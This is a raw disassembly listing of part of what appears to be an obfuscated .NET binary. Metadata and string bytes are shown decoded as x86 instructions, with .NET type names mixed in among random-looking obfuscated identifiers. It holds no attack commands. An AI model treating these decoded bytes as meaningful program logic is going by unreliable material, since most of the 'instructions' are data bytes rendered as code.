100025f7:	00 c4                	add    %al,%ah
100025f9:	07                   	pop    %es
100025fa:	49                   	dec    %ecx
100025fb:	06                   	push   %es
100025fc:	06                   	push   %es
100025fd:	00 97 05 49 06 06    	add    %dl,0x6064905(%edi)
10002603:	00 3a                	add    %bh,(%edx)
10002605:	03 4f 05             	add    0x5(%edi),%ecx
10002608:	06                   	push   %es
10002609:	00 5c 08 56          	add    %bl,0x56(%eax,%ecx,1)
1000260d:	02 06                	add    (%esi),%al
1000260f:	00 99 06 56 02 06    	add    %bl,0x6025606(%ecx)
10002615:	00 87 00 49 06 0e    	add    %al,0xe064900(%edi)
1000261b:	00 5b 03             	add    %bl,0x3(%ebx)
1000261e:	d4 06                	aam    $0x6
10002620:	06                   	push   %es
10002621:	00 60 00             	add    %ah,0x0(%eax)
10002624:	f2 02 06             	repnz add (%esi),%al
10002627:	00 50 06             	add    %dl,0x6(%eax)
1000262a:	49                   	dec    %ecx
1000262b:	06                   	push   %es
1000262c:	06                   	push   %es
1000262d:	00 b3 05 56 02 00    	add    %dh,0x25605(%ebx)
10002633:	00 00                	add    %al,(%eax)
10002635:	00 40 01             	add    %al,0x1(%eax)
10002638:	00 00                	add    %al,(%eax)
1000263a:	00 00                	add    %al,(%eax)
1000263c:	01 00                	add    %eax,(%eax)
1000263e:	01 00                	add    %eax,(%eax)
10002640:	81 01 10 00 eb 01    	addl   $0x1eb0010,(%ecx)
10002646:	eb 01                	jmp    0x10002649
10002648:	41                   	inc    %ecx
10002649:	00 01                	add    %al,(%ecx)
1000264b:	00 01                	add    %al,(%ecx)
1000264d:	00 0b                	add    %cl,(%ebx)
1000264f:	01 10                	add    %edx,(%eax)
10002651:	00 4a 02             	add    %cl,0x2(%edx)
10002654:	00 00                	add    %al,(%eax)
10002656:	51                   	push   %ecx
10002657:	00 01                	add    %al,(%ecx)
10002659:	00 09                	add    %cl,(%ecx)
1000265b:	00 0b                	add    %cl,(%ebx)
1000265d:	01 10                	add    %edx,(%eax)
1000265f:	00 20                	add    %ah,(%eax)
10002661:	02 00                	add    (%eax),%al
10002663:	00 51 00             	add    %dl,0x0(%ecx)
10002666:	13 00                	adc    (%eax),%eax
10002668:	09 00                	or     %eax,(%eax)
1000266a:	03 01                	add    (%ecx),%eax
1000266c:	10 00                	adc    %al,(%eax)
1000266e:	01 00                	add    %eax,(%eax)
10002670:	00 00                	add    %al,(%eax)
10002672:	41                   	inc    %ecx
10002673:	00 17                	add    %dl,(%edi)
10002675:	00 09                	add    %cl,(%ecx)
10002677:	00 06                	add    %al,(%esi)
10002679:	00 cd                	add    %cl,%ch
1000267b:	02 cf                	add    %bh,%cl
1000267d:	00 06                	add    %al,(%esi)
1000267f:	00 cb                	add    %cl,%bl
10002681:	00 d2                	add    %dl,%dl
10002683:	00 06                	add    %al,(%esi)
10002685:	00 13                	add    %dl,(%ebx)
10002687:	05 d2 00 06 00       	add    $0x600d2,%eax
1000268c:	27                   	daa
1000268d:	01 d2                	add    %edx,%edx
1000268f:	00 06                	add    %al,(%esi)
10002691:	00 b6 02 d5 00 06    	add    %dh,0x600d502(%esi)
10002697:	00 c9                	add    %cl,%cl
10002699:	02 d5                	add    %ch,%dl
1000269b:	00 06                	add    %al,(%esi)
1000269d:	00 b8 05 d5 00 06    	add    %bh,0x600d505(%eax)
100026a3:	00 60 02             	add    %ah,0x2(%eax)
100026a6:	d5 00                	aad    $0x0
100026a8:	06                   	push   %es
100026a9:	00 cd                	add    %cl,%ch
100026ab:	05 d5 00 06 00       	add    $0x600d5,%eax
100026b0:	82 08 d5             	orb    $0xd5,(%eax)
100026b3:	00 06                	add    %al,(%esi)
100026b5:	00 de                	add    %bl,%dh
100026b7:	00 d5                	add    %dl,%ch
100026b9:	00 06                	add    %al,(%esi)
100026bb:	00 e0                	add    %ah,%al
100026bd:	06                   	push   %es
100026be:	d5 00                	aad    $0x0
100026c0:	06                   	push   %es
100026c1:	00 90 02 d8 00 06    	add    %dl,0x600d802(%eax)
100026c7:	00 dd                	add    %bl,%ch
100026c9:	07                   	pop    %es
100026ca:	d8 00                	fadds  (%eax)
100026cc:	06                   	push   %es
100026cd:	00 75 00             	add    %dh,0x0(%ebp)
100026d0:	33 00                	xor    (%eax),%eax
100026d2:	06                   	push   %es
100026d3:	00 f6                	add    %dh,%dh
100026d5:	07                   	pop    %es
100026d6:	33 00                	xor    (%eax),%eax
100026d8:	06                   	push   %es
100026d9:	00 d9                	add    %bl,%cl
100026db:	02 33                	add    (%ebx),%dh
100026dd:	00 06                	add    %al,(%esi)
100026df:	00 0d 01 33 00 06    	add    %cl,0x6003301
100026e5:	00 3f                	add    %bh,(%edi)
100026e7:	05 33 00 06 00       	add    $0x60033,%eax
100026ec:	9e                   	sahf
100026ed:	05 33 00 06 00       	add    $0x60033,%eax
100026f2:	0d 06 cf 00 06       	or     $0x600cf06,%eax
100026f7:	00 8a 07 cf 00 06    	add    %cl,0x600cf07(%edx)
100026fd:	00 15 08 db 00 00    	add    %dl,0xdb08
10002703:	00 00                	add    %al,(%eax)
10002705:	00 80 00 91 20 99    	add    %al,-0x66df6f00(%eax)
1000270b:	07                   	pop    %es
1000270c:	e2 00                	loop   0x1000270e
1000270e:	01 00                	add    %eax,(%eax)
10002710:	00 00                	add    %al,(%eax)
10002712:	00 00                	add    %al,(%eax)
10002714:	80 00 91             	addb   $0x91,(%eax)
10002717:	20 1c 03             	and    %bl,(%ebx,%eax,1)
1000271a:	f4                   	hlt
1000271b:	00 0b                	add    %cl,(%ebx)
1000271d:	00 00                	add    %al,(%eax)
1000271f:	00 00                	add    %al,(%eax)
10002721:	00 80 00 91 20 49    	add    %al,0x49209100(%eax)
10002727:	08 fb                	or     %bh,%bl
10002729:	00 0d 00 50 20 00    	add    %cl,0x205000
1000272f:	00 00                	add    %al,(%eax)
10002731:	00 96 00 8e 00 06    	add    %dl,0x6008e00(%esi)
10002737:	01 12                	add    %edx,(%edx)
10002739:	00 00                	add    %al,(%eax)
1000273b:	00 00                	add    %al,(%eax)
1000273d:	00 80 00 91 20 66    	add    %al,0x66209100(%eax)
10002743:	03 0d 01 14 00 00    	add    0x1401,%ecx
10002749:	00 00                	add    %al,(%eax)
1000274b:	00 80 00 91 20 2e    	add    %al,0x2e209100(%eax)
10002751:	03 12                	add    (%edx),%edx
10002753:	01 15 00 00 00 00    	add    %edx,0x0
10002759:	00 80 00 91 20 06    	add    %al,0x6209100(%eax)
1000275f:	08 1e                	or     %bl,(%esi)
10002761:	01 1c 00             	add    %ebx,(%eax,%eax,1)
10002764:	0c 22                	or     $0x22,%al
10002766:	00 00                	add    %al,(%eax)
10002768:	00 00                	add    %al,(%eax)
1000276a:	93                   	xchg   %eax,%ebx
1000276b:	00 16                	add    %dl,(%esi)
1000276d:	00 27                	add    %ah,(%edi)
1000276f:	01 21                	add    %esp,(%ecx)
10002771:	00 7a 24             	add    %bh,0x24(%edx)
10002774:	00 00                	add    %al,(%eax)
10002776:	00 00                	add    %al,(%eax)
10002778:	86 18                	xchg   %bl,(%eax)
1000277a:	f2 06                	repnz push %es
1000277c:	06                   	push   %es
1000277d:	00 21                	add    %ah,(%ecx)
1000277f:	00 82 24 00 00 00    	add    %al,0x24(%edx)
10002785:	00 83 00 44 00 2b    	add    %al,0x2b004400(%ebx)
1000278b:	01 21                	add    %esp,(%ecx)
1000278d:	00 00                	add    %al,(%eax)
1000278f:	00 01                	add    %al,(%ecx)
10002791:	00 34 02             	add    %dh,(%edx,%eax,1)
10002794:	00 00                	add    %al,(%eax)
10002796:	02 00                	add    (%eax),%al
10002798:	72 01                	jb     0x1000279b
1000279a:	00 00                	add    %al,(%eax)
1000279c:	03 00                	add    (%eax),%eax
1000279e:	b4 00                	mov    $0x0,%ah
100027a0:	00 00                	add    %al,(%eax)
100027a2:	04 00                	add    $0x0,%al
100027a4:	f8                   	clc
100027a5:	00 00                	add    %al,(%eax)
100027a7:	00 05 00 bb 06 00    	add    %al,0x6bb00
100027ad:	00 06                	add    %al,(%esi)
100027af:	00 30                	add    %dh,(%eax)
100027b1:	05 00 00 07 00       	add    $0x70000,%eax
100027b6:	bf 01 00 00 08       	mov    $0x8000001,%edi
100027bb:	00 57 06             	add    %dl,0x6(%edi)
100027be:	00 00                	add    %al,(%eax)
100027c0:	09 00                	or     %eax,(%eax)
100027c2:	ae                   	scas   %es:(%edi),%al
100027c3:	01 02                	add    %eax,(%edx)
100027c5:	00 0a                	add    %cl,(%edx)
100027c7:	00 d4                	add    %dl,%ah
100027c9:	01 00                	add    %eax,(%eax)
100027cb:	00 01                	add    %al,(%ecx)
100027cd:	00 9e 05 02 00 02    	add    %bl,0x2000205(%esi)
100027d3:	00 fa                	add    %bh,%dl
100027d5:	01 00                	add    %eax,(%eax)
100027d7:	00 01                	add    %al,(%ecx)
100027d9:	00 3f                	add    %bh,(%edi)
100027db:	05 00 00 02 00       	add    $0x20000,%eax
100027e0:	e7 05                	out    %eax,$0x5
100027e2:	00 00                	add    %al,(%eax)
100027e4:	03 00                	add    (%eax),%eax
100027e6:	5d                   	pop    %ebp
100027e7:	01 00                	add    %eax,(%eax)
100027e9:	00 04 00             	add    %al,(%eax,%eax,1)
100027ec:	ff 06                	incl   (%esi)
100027ee:	02 00                	add    (%eax),%al
100027f0:	05 00 ba 02 00       	add    $0x2ba00,%eax
100027f5:	00 01                	add    %al,(%ecx)
100027f7:	00 81 01 00 00 02    	add    %al,0x2000001(%ecx)
100027fd:	00 49 01             	add    %cl,0x1(%ecx)
10002800:	00 00                	add    %al,(%eax)
10002802:	01 00                	add    %eax,(%eax)
10002804:	fe 05 00 00 01 00    	incb   0x10000
1000280a:	3f                   	aas
1000280b:	05 00 00 02 00       	add    $0x20000,%eax
10002810:	f8                   	clc
10002811:	00 00                	add    %al,(%eax)
10002813:	00 03                	add    %al,(%ebx)
10002815:	00 a4 00 00 00 04 00 	add    %ah,0x40000(%eax,%eax,1)
1000281c:	96                   	xchg   %eax,%esi
1000281d:	01 00                	add    %eax,(%eax)
1000281f:	00 05 00 72 08 00    	add    %al,0x87200
10002825:	00 06                	add    %al,(%esi)
10002827:	00 30                	add    %dh,(%eax)
10002829:	05 02 00 07 00       	add    $0x70002,%eax
1000282e:	77 02                	ja     0x10002832
10002830:	00 00                	add    %al,(%eax)
10002832:	01 00                	add    %eax,(%eax)
10002834:	3f                   	aas
10002835:	05 00 00 02 00       	add    $0x20000,%eax
1000283a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
1000283b:	02 00                	add    (%eax),%al
1000283d:	00 03                	add    %al,(%ebx)
1000283f:	00 0c 02             	add    %cl,(%edx,%eax,1)
10002842:	00 00                	add    %al,(%eax)
10002844:	04 00                	add    $0x0,%al
10002846:	2b 08                	sub    (%eax),%ecx
10002848:	00 00                	add    %al,(%eax)
1000284a:	05 00 ae 07 00       	add    $0x7ae00,%eax
1000284f:	00 01                	add    %al,(%ecx)
10002851:	00 72 03             	add    %dh,0x3(%edx)
10002854:	09 00                	or     %eax,(%eax)
10002856:	f2 06                	repnz push %es
10002858:	01 00                	add    %eax,(%eax)
1000285a:	11 00                	adc    %eax,(%eax)
1000285c:	f2 06                	repnz push %es
1000285e:	06                   	push   %es
1000285f:	00 19                	add    %bl,(%ecx)
10002861:	00 f2                	add    %dh,%dl
10002863:	06                   	push   %es
10002864:	0a 00                	or     (%eax),%al
10002866:	29 00                	sub    %eax,(%eax)
10002868:	f2 06                	repnz push %es
1000286a:	10 00                	adc    %al,(%eax)
1000286c:	31 00                	xor    %eax,(%eax)
1000286e:	f2 06                	repnz push %es
10002870:	10 00                	adc    %al,(%eax)
10002872:	39 00                	cmp    %eax,(%eax)
10002874:	f2 06                	repnz push %es
10002876:	10 00                	adc    %al,(%eax)
10002878:	41                   	inc    %ecx
10002879:	00 f2                	add    %dh,%dl
1000287b:	06                   	push   %es
1000287c:	10 00                	adc    %al,(%eax)
1000287e:	49                   	dec    %ecx
1000287f:	00 f2                	add    %dh,%dl
10002881:	06                   	push   %es
10002882:	10 00                	adc    %al,(%eax)
10002884:	51                   	push   %ecx
10002885:	00 f2                	add    %dh,%dl
10002887:	06                   	push   %es
10002888:	10 00                	adc    %al,(%eax)
1000288a:	59                   	pop    %ecx
1000288b:	00 f2                	add    %dh,%dl
1000288d:	06                   	push   %es
1000288e:	10 00                	adc    %al,(%eax)
10002890:	61                   	popa
10002891:	00 f2                	add    %dh,%dl
10002893:	06                   	push   %es
10002894:	15 00 69 00 f2       	adc    $0xf2006900,%eax
10002899:	06                   	push   %es
1000289a:	10 00                	adc    %al,(%eax)
1000289c:	71 00                	jno    0x1000289e
1000289e:	f2 06                	repnz push %es
100028a0:	10 00                	adc    %al,(%eax)
100028a2:	79 00                	jns    0x100028a4
100028a4:	f2 06                	repnz push %es
100028a6:	10 00                	adc    %al,(%eax)
100028a8:	99                   	cltd
100028a9:	00 f2                	add    %dh,%dl
100028ab:	06                   	push   %es
100028ac:	06                   	push   %es
100028ad:	00 b1 00 29 05 27    	add    %dh,0x27052900(%ecx)
100028b3:	00 b9 00 b0 06 33    	add    %bh,0x3306b000(%ecx)
100028b9:	00 b9 00 66 08 36    	add    %bh,0x36086600(%ecx)
100028bf:	00 c1                	add    %al,%cl
100028c1:	00 37                	add    %dh,(%edi)
100028c3:	01 3c 00             	add    %edi,(%eax,%eax,1)
100028c6:	c9                   	leave
100028c7:	00 83 05 41 00 c1    	add    %al,-0x3effbefb(%ebx)
100028cd:	00 94 05 47 00 d1 00 	add    %dl,0xd10047(%ebp,%eax,1)
100028d4:	53                   	push   %ebx
100028d5:	03 4d 00             	add    0x0(%ebp),%ecx
100028d8:	91                   	xchg   %eax,%ecx
100028d9:	00 f2                	add    %dh,%dl
100028db:	06                   	push   %es
100028dc:	10 00                	adc    %al,(%eax)
100028de:	d9 00                	flds   (%eax)
100028e0:	b5 06                	mov    $0x6,%ch
100028e2:	53                   	push   %ebx
100028e3:	00 89 00 0d 03 58    	add    %cl,0x58030d00(%ecx)
100028e9:	00 89 00 45 03 5e    	add    %cl,0x5e034500(%ecx)
100028ef:	00 89 00 44 06 06    	add    %cl,0x6064400(%ecx)
100028f5:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028f8:	f2 06                	repnz push %es
100028fa:	06                   	push   %es
100028fb:	00 0c 00             	add    %cl,(%eax,%eax,1)
100028fe:	41                   	inc    %ecx
100028ff:	03 6f 00             	add    0x0(%edi),%ebp
10002902:	e1 00                	loope  0x10002904
10002904:	78 07                	js     0x1000290d
10002906:	75 00                	jne    0x10002908
10002908:	14 00                	adc    $0x0,%al
1000290a:	f2 06                	repnz push %es
1000290c:	85 00                	test   %eax,(%eax)
1000290e:	f9                   	stc
1000290f:	00 81 03 8b 00 f9    	add    %al,-0x6ff74fd(%ecx)
10002915:	00 41 08             	add    %al,0x8(%ecx)
10002918:	a8 00                	test   $0x0,%al
1000291a:	09 01                	or     %eax,(%ecx)
1000291c:	f2 06                	repnz push %es
1000291e:	06                   	push   %es
1000291f:	00 09                	add    %cl,(%ecx)
10002921:	01 cc                	add    %ecx,%esp
10002923:	07                   	pop    %es
10002924:	b6 00                	mov    $0x0,%dh
10002926:	81 00 f2 06 06 00    	addl   $0x606f2,(%eax)
1000292c:	11 01                	adc    %eax,(%ecx)
1000292e:	6b 06 bb             	imul   $0xffffffbb,(%esi),%eax
10002931:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002934:	81 07 c0 00 2e 00    	addl   $0x2e00c0,(%edi)
1000293a:	0b 00                	or     (%eax),%eax
1000293c:	30 01                	xor    %al,(%ecx)
1000293e:	2e 00 13             	add    %dl,%cs:(%ebx)
10002941:	00 39                	add    %bh,(%ecx)
10002943:	01 2e                	add    %ebp,(%esi)
10002945:	00 1b                	add    %bl,(%ebx)
10002947:	00 58 01             	add    %bl,0x1(%eax)
1000294a:	2e 00 23             	add    %ah,%cs:(%ebx)
1000294d:	00 61 01             	add    %ah,0x1(%ecx)
10002950:	2e 00 2b             	add    %ch,%cs:(%ebx)
10002953:	00 75 01             	add    %dh,0x1(%ebp)
10002956:	2e 00 33             	add    %dh,%cs:(%ebx)
10002959:	00 75 01             	add    %dh,0x1(%ebp)
1000295c:	2e 00 3b             	add    %bh,%cs:(%ebx)
1000295f:	00 75 01             	add    %dh,0x1(%ebp)
10002962:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
10002966:	61                   	popa
10002967:	01 2e                	add    %ebp,(%esi)
10002969:	00 4b 00             	add    %cl,0x0(%ebx)
1000296c:	7b 01                	jnp    0x1000296f
1000296e:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
10002972:	75 01                	jne    0x10002975
10002974:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
10002978:	75 01                	jne    0x1000297b
1000297a:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
1000297e:	93                   	xchg   %eax,%ebx
1000297f:	01 2e                	add    %ebp,(%esi)
10002981:	00 6b 00             	add    %ch,0x0(%ebx)
10002984:	bd 01 2e 00 73       	mov    $0x73002e01,%ebp
10002989:	00 ca                	add    %cl,%dl
1000298b:	01 a3 00 7b 00 14    	add    %esp,0x14007b00(%ebx)
10002991:	02 00                	add    (%eax),%al
10002993:	01 7b 00             	add    %edi,0x0(%ebx)
10002996:	14 02                	adc    $0x2,%al
10002998:	1a 00                	sbb    (%eax),%al
1000299a:	62 00                	bound  %eax,(%eax)
1000299c:	24 06                	and    $0x6,%al
1000299e:	69 00 7e 00 40 01    	imul   $0x140007e,(%eax),%eax
100029a4:	03 00                	add    (%eax),%eax
100029a6:	99                   	cltd
100029a7:	07                   	pop    %es
100029a8:	01 00                	add    %eax,(%eax)
100029aa:	40                   	inc    %eax
100029ab:	01 05 00 1c 03 01    	add    %eax,0x1031c00
100029b1:	00 40 01             	add    %al,0x1(%eax)
100029b4:	07                   	pop    %es
100029b5:	00 49 08             	add    %cl,0x8(%ecx)
100029b8:	01 00                	add    %eax,(%eax)
100029ba:	00 01                	add    %al,(%ecx)
100029bc:	0b 00                	or     (%eax),%eax
100029be:	66 03 01             	add    (%ecx),%ax
100029c1:	00 40 01             	add    %al,0x1(%eax)
100029c4:	0d 00 2e 03 01       	or     $0x1032e00,%eax
100029c9:	00 40 01             	add    %al,0x1(%eax)
100029cc:	0f 00 06             	sldt   (%esi)
100029cf:	08 01                	or     %al,(%ecx)
100029d1:	00 04 80             	add    %al,(%eax,%eax,4)
100029d4:	00 00                	add    %al,(%eax)
100029d6:	01 00                	add    %eax,(%eax)
	...
100029e4:	eb 01                	jmp    0x100029e7
100029e6:	00 00                	add    %al,(%eax)
100029e8:	04 00                	add    $0x0,%al
	...
100029f2:	00 00                	add    %al,(%eax)
100029f4:	c6 00 d0             	movb   $0xd0,(%eax)
100029f7:	02 00                	add    (%eax),%al
100029f9:	00 00                	add    %al,(%eax)
100029fb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
10002a06:	00 00                	add    %al,(%eax)
10002a08:	c6 00 49             	movb   $0x49,(%eax)
10002a0b:	06                   	push   %es
10002a0c:	00 00                	add    %al,(%eax)
10002a0e:	00 00                	add    %al,(%eax)
10002a10:	04 00                	add    $0x0,%al
	...
10002a1a:	00 00                	add    %al,(%eax)
10002a1c:	c6 00 87             	movb   $0x87,(%eax)
10002a1f:	03 00                	add    (%eax),%eax
10002a21:	00 00                	add    %al,(%eax)
10002a23:	00 03                	add    %al,(%ebx)
10002a25:	00 02                	add    %al,(%edx)
10002a27:	00 04 00             	add    %al,(%eax,%eax,1)
10002a2a:	02 00                	add    (%eax),%al
10002a2c:	05 00 02 00 21       	add    $0x21000200,%eax
10002a31:	00 2e                	add    %ch,(%esi)
10002a33:	00 41 00             	add    %al,0x0(%ecx)
10002a36:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a37:	00 43 00             	add    %al,0x0(%ebx)
10002a3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10002a3b:	00 00                	add    %al,(%eax)
10002a3d:	00 00                	add    %al,(%eax)
10002a3f:	00 00                	add    %al,(%eax)
10002a41:	3c 3e                	cmp    $0x3e,%al
10002a43:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
10002a46:	44                   	inc    %esp
10002a47:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
10002a4e:	6c                   	insb   (%dx),%es:(%edi)
10002a4f:	61                   	popa
10002a50:	73 73                	jae    0x10002ac5
10002a52:	34 5f                	xor    $0x5f,%al
10002a54:	30 00                	xor    %al,(%eax)
10002a56:	3c 48                	cmp    $0x48,%al
10002a58:	43                   	inc    %ebx
10002a59:	4d                   	dec    %ebp
10002a5a:	75 64                	jne    0x10002ac0
10002a5c:	76 39                	jbe    0x10002a97
10002a5e:	4c                   	dec    %esp
10002a5f:	55                   	push   %ebp
10002a60:	41                   	inc    %ecx
10002a61:	59                   	pop    %ecx
10002a62:	73 6b                	jae    0x10002acf
10002a64:	61                   	popa
10002a65:	30 70 31             	xor    %dh,0x31(%eax)
10002a68:	5a                   	pop    %edx
10002a69:	72 54                	jb     0x10002abf
10002a6b:	33 3e                	xor    (%esi),%edi
10002a6d:	67 5f                	addr16 pop %edi
10002a6f:	5f                   	pop    %edi
10002a70:	4c                   	dec    %esp
10002a71:	6a 63                	push   $0x63
10002a73:	43                   	inc    %ebx
10002a74:	73 72                	jae    0x10002ae8
10002a76:	77 69                	ja     0x10002ae1
10002a78:	6b 76 4c 59          	imul   $0x59,0x4c(%esi),%esi
10002a7c:	58                   	pop    %eax
10002a7d:	38 76 7c             	cmp    %dh,0x7c(%esi)
10002a80:	34 5f                	xor    $0x5f,%al
10002a82:	30 00                	xor    %al,(%eax)
10002a84:	3c 48                	cmp    $0x48,%al
10002a86:	43                   	inc    %ebx
10002a87:	4d                   	dec    %ebp
10002a88:	75 64                	jne    0x10002aee
10002a8a:	76 39                	jbe    0x10002ac5
10002a8c:	4c                   	dec    %esp
10002a8d:	55                   	push   %ebp
10002a8e:	41                   	inc    %ecx
10002a8f:	59                   	pop    %ecx
10002a90:	73 6b                	jae    0x10002afd
10002a92:	61                   	popa
10002a93:	30 70 31             	xor    %dh,0x31(%eax)
10002a96:	5a                   	pop    %edx
10002a97:	72 54                	jb     0x10002aed
10002a99:	33 3e                	xor    (%esi),%edi
10002a9b:	62 5f 5f             	bound  %ebx,0x5f(%edi)
10002a9e:	31 00                	xor    %eax,(%eax)
10002aa0:	49                   	dec    %ecx
10002aa1:	45                   	inc    %ebp
10002aa2:	6e                   	outsb  %ds:(%esi),(%dx)
10002aa3:	75 6d                	jne    0x10002b12
10002aa5:	65 72 61             	gs jb  0x10002b09
10002aa8:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
10002aac:	31 00                	xor    %eax,(%eax)
10002aae:	4c                   	dec    %esp
10002aaf:	69 73 74 60 31 00 5a 	imul   $0x5a003160,0x74(%ebx),%esi
10002ab6:	66 58                	pop    %ax
10002ab8:	69 52 49 58 78 6b 78 	imul   $0x786b7858,0x49(%edx),%edx
10002abf:	4b                   	dec    %ebx
10002ac0:	5a                   	pop    %edx
10002ac1:	65 65 5a             	gs gs pop %edx
10002ac4:	47                   	inc    %edi
10002ac5:	32 00                	xor    (%eax),%al
10002ac7:	46                   	inc    %esi
10002ac8:	75 6e                	jne    0x10002b38
10002aca:	63 60 32             	arpl   %esp,0x32(%eax)
10002acd:	00 48 43             	add    %cl,0x43(%eax)
10002ad0:	4d                   	dec    %ebp
10002ad1:	75 64                	jne    0x10002b37
10002ad3:	76 39                	jbe    0x10002b0e
10002ad5:	4c                   	dec    %esp
10002ad6:	55                   	push   %ebp
10002ad7:	41                   	inc    %ecx
10002ad8:	59                   	pop    %ecx
10002ad9:	73 6b                	jae    0x10002b46
10002adb:	61                   	popa
10002adc:	30 70 31             	xor    %dh,0x31(%eax)
10002adf:	5a                   	pop    %edx
10002ae0:	72 54                	jb     0x10002b36
10002ae2:	33 00                	xor    (%eax),%eax
10002ae4:	41                   	inc    %ecx
10002ae5:	64 6d                	fs insl (%dx),%es:(%edi)
10002ae7:	6f                   	outsl  %ds:(%esi),(%dx)
10002ae8:	42                   	inc    %edx
10002ae9:	4a                   	dec    %edx
10002aea:	41                   	inc    %ecx
10002aeb:	6f                   	outsl  %ds:(%esi),(%dx)
10002aec:	62 33                	bound  %esi,(%ebx)
10002aee:	45                   	inc    %ebp
10002aef:	30 30                	xor    %dh,(%eax)
10002af1:	68 34 00 48 42       	push   $0x42480034
10002af6:	4f                   	dec    %edi
10002af7:	73 65                	jae    0x10002b5e
10002af9:	66 61                	popaw
10002afb:	4c                   	dec    %esp
10002afc:	6d                   	insl   (%dx),%es:(%edi)
10002afd:	78 36                	js     0x10002b35
10002aff:	55                   	push   %ebp
10002b00:	72 45                	jb     0x10002b47
10002b02:	33 58 59             	xor    0x59(%eax),%ebx
10002b05:	51                   	push   %ecx
10002b06:	7a 63                	jp     0x10002b6b
10002b08:	76 34                	jbe    0x10002b3e
10002b0a:	00 57 6a             	add    %dl,0x6a(%edi)
10002b0d:	69 5a 5a 7a 46 31 66 	imul   $0x6631467a,0x5a(%edx),%ebx
10002b14:	71 72                	jno    0x10002b88
10002b16:	6f                   	outsl  %ds:(%esi),(%dx)
10002b17:	58                   	pop    %eax
10002b18:	74 6b                	je     0x10002b85
10002b1a:	6a 36                	push   $0x36
10002b1c:	35 00 44 57 78       	xor    $0x78574400,%eax
10002b21:	42                   	inc    %edx
10002b22:	62 51 56             	bound  %edx,0x56(%ecx)
10002b25:	70 6a                	jo     0x10002b91
10002b27:	4b                   	dec    %ebx
10002b28:	4b                   	dec    %ebx
10002b29:	4f                   	dec    %edi
10002b2a:	69 51 70 56 64 4b 4e 	imul   $0x4e4b6456,0x70(%ecx),%edx
10002b31:	30 72 58             	xor    %dh,0x58(%edx)
10002b34:	38 37                	cmp    %dh,(%edi)
10002b36:	35 00 53 4e 6d       	xor    $0x6d4e5300,%eax
10002b3b:	4e                   	dec    %esi
10002b3c:	64 71 68             	fs jno 0x10002ba7
10002b3f:	4b                   	dec    %ebx
10002b40:	6e                   	outsb  %ds:(%esi),(%dx)
10002b41:	76 62                	jbe    0x10002ba5
10002b43:	54                   	push   %esp
10002b44:	61                   	popa
10002b45:	5a                   	pop    %edx
10002b46:	76 6a                	jbe    0x10002bb2
10002b48:	31 45 70             	xor    %eax,0x70(%ebp)
10002b4b:	36 00 55 58          	add    %dl,%ss:0x58(%ebp)
10002b4f:	78 6f                	js     0x10002bc0
10002b51:	4f                   	dec    %edi
10002b52:	4a                   	dec    %edx
10002b53:	5a                   	pop    %edx
10002b54:	7a 69                	jp     0x10002bbf
10002b56:	6f                   	outsl  %ds:(%esi),(%dx)
10002b57:	74 74                	je     0x10002bcd
10002b59:	61                   	popa
10002b5a:	61                   	popa
10002b5b:	6c                   	insb   (%dx),%es:(%edi)
10002b5c:	54                   	push   %esp
10002b5d:	6e                   	outsb  %ds:(%esi),(%dx)
10002b5e:	49                   	dec    %ecx
10002b5f:	56                   	push   %esi
10002b60:	49                   	dec    %ecx
10002b61:	38 32                	cmp    %dh,(%edx)
10002b63:	69 58 37 00 46 41 61 	imul   $0x61414600,0x37(%eax),%ebx
10002b6a:	56                   	push   %esi
10002b6b:	4a                   	dec    %edx
10002b6c:	43                   	inc    %ebx
10002b6d:	57                   	push   %edi
10002b6e:	69 79 6d 4d 6f 61 70 	imul   $0x70616f4d,0x6d(%ecx),%edi
10002b75:	37                   	aaa
10002b76:	00 67 65             	add    %ah,0x65(%edi)
10002b79:	74 5f                	je     0x10002bda
10002b7b:	55                   	push   %ebp
10002b7c:	54                   	push   %esp
10002b7d:	46                   	inc    %esi
10002b7e:	38 00                	cmp    %al,(%eax)
10002b80:	3c 4d                	cmp    $0x4d,%al
10002b82:	6f                   	outsl  %ds:(%esi),(%dx)
10002b83:	64 75 6c             	fs jne 0x10002bf2
10002b86:	65 3e 00 55 77       	gs add %dl,%ds:0x77(%ebp)
10002b8b:	62 6a 71             	bound  %ebp,0x71(%edx)
10002b8e:	53                   	push   %ebx
10002b8f:	52                   	push   %edx
10002b90:	55                   	push   %ebp
10002b91:	32 5a 6f             	xor    0x6f(%edx),%bl
10002b94:	50                   	push   %eax
10002b95:	55                   	push   %ebp
10002b96:	46                   	inc    %esi
10002b97:	66 57                	push   %di
10002b99:	4d                   	dec    %ebp
10002b9a:	47                   	inc    %edi
10002b9b:	41                   	inc    %ecx
10002b9c:	00 4f 4a             	add    %cl,0x4a(%edi)
10002b9f:	43                   	inc    %ebx
10002ba0:	62 76 4f             	bound  %esi,0x4f(%esi)
10002ba3:	4f                   	dec    %edi
10002ba4:	6c                   	insb   (%dx),%es:(%edi)
10002ba5:	6b 43 75 72          	imul   $0x72,0x75(%ebx),%eax
10002ba9:	4e                   	dec    %esi
10002baa:	78 7a                	js     0x10002c26
10002bac:	58                   	pop    %eax
10002bad:	70 4b                	jo     0x10002bfa
10002baf:	41                   	inc    %ecx
10002bb0:	44                   	inc    %esp
10002bb1:	00 50 4c             	add    %dl,0x4c(%eax)
10002bb4:	72 53                	jb     0x10002c09
10002bb6:	42                   	inc    %edx
10002bb7:	4e                   	dec    %esi
10002bb8:	67 37                	addr16 aaa
10002bba:	59                   	pop    %ecx
10002bbb:	36 72 70             	ss jb  0x10002c2e
10002bbe:	73 44                	jae    0x10002c04
10002bc0:	00 59 6b             	add    %bl,0x6b(%ecx)
10002bc3:	44                   	inc    %esp
10002bc4:	70 55                	jo     0x10002c1b
10002bc6:	78 39                	js     0x10002c01
10002bc8:	75 64                	jne    0x10002c2e
10002bca:	4d                   	dec    %ebp
10002bcb:	56                   	push   %esi
10002bcc:	75 66                	jne    0x10002c34
